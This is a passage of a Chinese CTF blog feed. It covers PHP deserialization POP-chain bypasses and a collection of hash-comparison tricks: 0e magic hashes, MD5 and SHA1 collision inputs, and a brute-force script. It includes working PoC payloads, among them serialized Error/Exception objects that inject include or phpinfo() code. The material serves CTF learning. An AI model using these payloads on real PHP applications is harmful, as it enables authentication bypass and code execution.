payloadO:1:&quot;A&quot;:2:&#123;s:4:&quot;info&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;end&quot;;N&#125;s:3:&quot;end&quot;;s:2:&quot;1&quot;;&#125;</code></pre><h2 id="两变量哈希相等"><a href="#两变量哈希相等" class="headerlink" title="两变量哈希相等"></a>两变量哈希相等</h2><h3 id="引用绕过"><a href="#引用绕过" class="headerlink" title="引用绕过"></a>引用绕过</h3><p>b 取 a 的地址</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="title function_ invoke__">uniqid</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;a === <span class="variable language_">$this</span>-&gt;b) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Success&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;b=&amp;<span class="variable">$test</span>-&gt;a;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>));</span><br></pre></td></tr></table></figure><h3 id="内置类绕过"><a href="#内置类绕过" class="headerlink" title="内置类绕过"></a>内置类绕过</h3><h4 id="Error（仅能用于-PHP7）"><a href="#Error（仅能用于-PHP7）" class="headerlink" title="Error（仅能用于 PHP7）"></a>Error（仅能用于 PHP7）</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%d0%99%93%9e%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> SYCLOVER;</span><br><span class="line"><span class="variable">$c</span>-&gt;syc = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;lover = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//注意两个Error一定要同行</span></span><br><span class="line"><span class="comment">//str开头要用?&gt;闭合</span></span><br></pre></td></tr></table></figure><h4 id="Exception-PHP5-PHP7-可用"><a href="#Exception-PHP5-PHP7-可用" class="headerlink" title="Exception(PHP5,PHP7 可用)"></a>Exception(PHP5,PHP7 可用)</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CDUTSEC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&quot;phpinfo();?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$cmd</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$tr</span> = <span class="keyword">new</span> CDUTSEC;</span><br><span class="line"><span class="variable">$tr</span>-&gt;var1=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$tr</span>-&gt;var2=<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$tr</span>));</span><br></pre></td></tr></table></figure><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>参考文献<br><a href="https://5ime.cn/unserialize.html">https://5ime.cn/unserialize.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h1&gt;&lt;p&gt;构造 pop 链，归根结底就是一条绳子，从你开始的函数穿到危险函数（或者指向 flag），所以你要做的第一件事，就是确认你的</summary>
      
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/tags/CTF/"/>
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
    <category term="PHP" scheme="https://blog.hatchet.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>常见的哈希函数绕过个人收藏</title>
    <link href="https://blog.hatchet.top/posts/66a71aff.html"/>
    <id>https://blog.hatchet.top/posts/66a71aff.html</id>
    <published>2024-08-24T22:32:27.000Z</published>
    <updated>2024-09-25T09:46:05.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><ul><li>php 对 MD5 加密方法为$a&#x3D;md5(‘string’);比起 python 就是神仙级，壮哉 php。</li><li>php 中存在强比较(&#x3D;&#x3D;&#x2F;!&#x3D;)和弱比较(&#x3D;&#x3D;&#x3D;&#x2F;!&#x3D;&#x3D;)，两个数组能绕过强和弱两个比较(a[]&#x3D;1&amp;b[]&#x3D;2)，因为 md5 不会处理数组，返回的结果都为 bool(false)</li><li>0e+纯数字的字符串会使 php 误认为是科学计数法, 从而转换为 0。</li><li><ul><li>只能绕过弱比较，<strong>且仅为 0e 开头的字符串是不能绕过比较的。</strong></li></ul></li><li>md5($password,’true’)-&gt;ffifdyop 多用于 sql 绕过密码</li></ul><h1 id="MD4"><a href="#MD4" class="headerlink" title="MD4"></a>MD4</h1><h2 id="md4-等于自己-a-md4-a"><a href="#md4-等于自己-a-md4-a" class="headerlink" title="md4 等于自己 -&gt; $a&#x3D;&#x3D;md4($a);"></a>md4 等于自己 -&gt; $a&#x3D;&#x3D;md4($a);</h2><pre><code>0e251288019 0e898201062</code></pre><h1 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h1><h2 id="md5-后-0e-数字-md5-a-md5-b"><a href="#md5-后-0e-数字-md5-a-md5-b" class="headerlink" title="md5 后 0e+数字 -&gt; md5($a)&#x3D;&#x3D;md5($b)"></a>md5 后 0e+数字 -&gt; md5($a)&#x3D;&#x3D;md5($b)</h2><p>部分</p><pre><code>byGcY sonZ7y QNKCDZO 240610708 s878926199a s155964671a s214587387a</code></pre><h2 id="md5-后-等于自己-a-md5-a"><a href="#md5-后-等于自己-a-md5-a" class="headerlink" title="md5 后 等于自己 -&gt; $a&#x3D;&#x3D;md5($a)"></a>md5 后 等于自己 -&gt; $a&#x3D;&#x3D;md5($a)</h2><p>很多</p><pre><code>0e215962017 0e00275209979 0e00506035745 0e005404518110e00678205148 0e00741250258 0e00928251504 0e013500161140e01352028862 0e01392313004 0e01875552079 0e019759039830e02042356163 0e02218562930 0e02451355147 0e027399702940e02760920150 0e02784726287 0e03298616350 0e03393034171</code></pre><h2 id="双-md5-后等于自己-a-md5-md5-a-（没错真的有这个数）"><a href="#双-md5-后等于自己-a-md5-md5-a-（没错真的有这个数）" class="headerlink" title="双 md5 后等于自己 -&gt; $a&#x3D;&#x3D;md5(md5($a)) （没错真的有这个数）"></a>双 md5 后等于自己 -&gt; $a&#x3D;&#x3D;md5(md5($a)) （没错真的有这个数）</h2><p>0e1138100474</p><h2 id="单-md5-后等于双-md5-后的自己-md5-a-md5-md5-a"><a href="#单-md5-后等于双-md5-后的自己-md5-a-md5-md5-a" class="headerlink" title="单 md5 后等于双 md5 后的自己 -&gt; md5($a)&#x3D;&#x3D;md5(md5($a))"></a>单 md5 后等于双 md5 后的自己 -&gt; md5($a)&#x3D;&#x3D;md5(md5($a))</h2><p>（施工中）</p><h2 id="如果你可以-serialize-反序列化控制数字，而题目限制了字符长度为-5-以下"><a href="#如果你可以-serialize-反序列化控制数字，而题目限制了字符长度为-5-以下" class="headerlink" title="如果你可以 serialize 反序列化控制数字，而题目限制了字符长度为 5 以下"></a>如果你可以 serialize 反序列化控制数字，而题目限制了字符长度为 5 以下</h2><p>那你可以试试 INF 和 NAN 两个数字，因为无法求值，它们的 md5 值就是字符串的 md5 值</p><h2 id="md5-强相等碰撞-md5-a-md5-b-md5-c"><a href="#md5-强相等碰撞-md5-a-md5-b-md5-c" class="headerlink" title="md5 强相等碰撞 -&gt; md5($a)&#x3D;&#x3D;&#x3D;md5($b)&#x3D;&#x3D;&#x3D;md5($c)"></a>md5 强相等碰撞 -&gt; md5($a)&#x3D;&#x3D;&#x3D;md5($b)&#x3D;&#x3D;&#x3D;md5($c)</h2><pre><code>a=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&amp;b=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&amp;c=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab</code></pre><p>数据大抵是没有问题的，出错可以试着检查下是否支持 url 编码，这里点名 绿色 hackbar，感觉直接传 url 编码的参数总会报错。打 web 做这种题一定要用 burpsuite 传参，鬼知道出什么问题，，有能力的可以 python 写 request</p><h2 id="md5-相同生成工具-fastcoll"><a href="#md5-相同生成工具-fastcoll" class="headerlink" title="md5 相同生成工具 fastcoll"></a>md5 相同生成工具 fastcoll</h2><p><a href="https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip">https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip</a></p><pre><code>fastcoll -o a a1</code></pre><p>可以得到两个相同的 MD5 值的文件，ulencode 后传入。</p><h1 id="SHA1"><a href="#SHA1" class="headerlink" title="SHA1"></a>SHA1</h1><h2 id="sha1-后-0e-数字-sha1-a-sha1-b"><a href="#sha1-后-0e-数字-sha1-a-sha1-b" class="headerlink" title="sha1 后 0e+数字 -&gt; sha1($a)&#x3D;&#x3D;sha1($b)"></a>sha1 后 0e+数字 -&gt; sha1($a)&#x3D;&#x3D;sha1($b)</h2><p>aaroZmOk aaK1STfY aaO8zKZF aa3OFF9m<br>f2WfQ iv2Cn</p><h2 id="sha1-强相等碰撞-sha1-a-sha1-b"><a href="#sha1-强相等碰撞-sha1-a-sha1-b" class="headerlink" title="sha1 强相等碰撞 -&gt; sha1($a)&#x3D;&#x3D;&#x3D;sha1(b)"></a>sha1 强相等碰撞 -&gt; sha1($a)&#x3D;&#x3D;&#x3D;sha1(b)</h2><pre><code>array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</code></pre><h2 id="sha1-后等于自己"><a href="#sha1-后等于自己" class="headerlink" title="sha1 后等于自己"></a>sha1 后等于自己</h2><pre><code>              text                                            SHA1 Hash0e00000000000000000000081614617300000000 ==&gt; 0e653075259409996322874922854682592190700e00000000000000000000721902017120000000 ==&gt; 0e949811594982522954181824538411404832740e01011001101011010001101110101100101000 ==&gt; 0e489065231519767511176774637871111065980e11001000001010011000100000010001101000 ==&gt; 0e634071849609304190270627777050813794520e01000001100000001010011011001000000100 ==&gt; 0e559620723883970838143467337186982137960e10011110000101101000011101011010100100 ==&gt; 0e311885854172858287853553367742377127920e01010111000111111010101011010111010100 ==&gt; 0e459063445696166594288088920912619691810e00100001110000001111010000010011101100 ==&gt; 0e148602586690523325495686077104381329530e11110000111010001001101111111110010010 ==&gt; 0e121742584363857585528744269416865384830e10111110011100101100010101111010000110 ==&gt; 0e997743982825933760434620385722813853890e11001111110111110010111010000011110110 ==&gt; 0e631852213010346249403454710743578887970e00001010010101100100101011101110001110 ==&gt; 0e909439887721717490544135938881059867820e01011101110010111011110010010010101110 ==&gt; 0e016088001926598035767713466074417378260e10111110101111001000000100011101101110 ==&gt; 0e490945414584794952630342944210251869380e11100111101110011010111001010101111110 ==&gt; 0e557707061499487600862007135058418875430e11111001010101100110011001010001110001 ==&gt; 0e911206871211638095158241354350299581370e01000111101111110010010010000001001001 ==&gt; 0e780717973285463693018254208488724518490e00100110100010100110001101110110110101 ==&gt; 0e060773804082606146592199205610827676320e11111100001011000011110100100010111101 ==&gt; 0e121491203544153352207583994927139215880e00111100110101101001000101011011111101 ==&gt; 0e386611265697905555984319050654038705160e10100011100101000001110010100110100011 ==&gt; 0e557450781546402125115962590559102780700e10011110011111001001100100000111011011 ==&gt; 0e20319731123101477913295720812414482217</code></pre><h1 id="自己爆破用脚本"><a href="#自己爆破用脚本" class="headerlink" title="自己爆破用脚本"></a>自己爆破用脚本</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_md5</span>(<span class="params">md5_hash</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;检查MD5哈希值是否以0e开头并且后面跟随纯数字&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> md5_hash.startswith(<span class="string">&quot;0e&quot;</span>) <span class="keyword">and</span> md5_hash[<span class="number">2</span>:].isdigit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_valid_a</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;暴力求解a，使得md5(a)和md5(md5(a))都满足条件&quot;&quot;&quot;</span></span><br><span class="line">    chars = (</span><br><span class="line">        string.ascii_lowercase + string.ascii_uppercase + string.digits</span><br><span class="line">    )  <span class="comment"># 允许的字符集</span></span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):  <span class="comment"># 控制a的长度</span></span><br><span class="line">        <span class="built_in">print</span>(length)</span><br><span class="line">        <span class="keyword">for</span> candidate <span class="keyword">in</span> itertools.product(chars, repeat=length):</span><br><span class="line">            a = <span class="string">&quot;&quot;</span>.join(candidate)</span><br><span class="line">            md5_a = hashlib.md5(a.encode()).hexdigest()</span><br><span class="line">            md5_md5_a = hashlib.md5(md5_a.encode()).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> is_valid_md5(md5_a) <span class="keyword">and</span> is_valid_md5(md5_md5_a):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Found a: <span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;md5(a): <span class="subst">&#123;md5_a&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;md5(md5(a)): <span class="subst">&#123;md5_md5_a&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行暴力求解</span></span><br><span class="line">find_valid_a()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="哈希长度拓展攻击"><a href="#哈希长度拓展攻击" class="headerlink" title="哈希长度拓展攻击"></a>哈希长度拓展攻击</h1><p>已知部分字符串需要构造相同 md5 值<br>需要知道 key 长度  </p><h1 id="说在后面"><a href="#说在后面" class="headerlink" title="说在后面"></a>说在后面</h1><p>我在一开始学习 MD5 绕过时吃了很多亏。还是被勾币出题人拷打少了，导致很多打只能自己硬咽下去。这是博客的一篇文章，在写之时深深感慨自己在茫茫搜索 MD5 时的无力，到自己写时，大大弥补加了很多自己当时搜索时的关键词，希望有点帮助吧。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;php 对 MD5 加密方法为$a&amp;#x3D;md5(‘string’);比起 python 就是神仙级，壮哉 </summary>
      
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/tags/CTF/"/>
    
    <category term="crypto" scheme="https://blog.hatchet.top/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>test</title>
    <link href="https://blog.hatchet.top/posts/d87f7e0c.html"/>
    <id>https://blog.hatchet.top/posts/d87f7e0c.html</id>
    <published>2024-08-24T22:15:58.000Z</published>
    <updated>2024-09-20T12:20:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>不要学我熬夜做东西。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;不要学我熬夜做东西。。。&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Markdown格式测试</title>
    <link href="https://blog.hatchet.top/posts/db60f10c.html"/>
    <id>https://blog.hatchet.top/posts/db60f10c.html</id>
    <published>2024-08-24T22:00:00.000Z</published>
    <updated>2024-09-20T12:20:08.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="这是一级标题"><a href="#这是一级标题" class="headerlink" title="这是一级标题"></a>这是一级标题</h1><h2 id="这是二级标题"><a href="#这是二级标题" class="headerlink" title="这是二级标题"></a>这是二级标题</h2><h3 id="这是三级标题"><a href="#这是三级标题" class="headerlink" title="这是三级标题"></a>这是三级标题</h3><p>正文这么打</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> this is terminal <span class="built_in">command</span></span><br></pre></td></tr></table></figure><p><a href="https://hexo.io/">这是超链接</a></p><p><a href="https://www.baidu.com/">https://www.baidu.com</a><br><img src="http://www.wazhishi.com/uploads/allimg/240328/0K453B43-0.jpg"><br>不论怎么讲，会战兵力是八十万对六十万，优势在我</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;这是一级标题&quot;&gt;&lt;a href=&quot;#这是一级标题&quot; class=&quot;headerlink&quot; title=&quot;这是一级标题&quot;&gt;&lt;/a&gt;这是一级标题&lt;/h1&gt;&lt;h2 id=&quot;这是二级标题&quot;&gt;&lt;a href=&quot;#这是二级标题&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    
  </entry>
  
</feed>
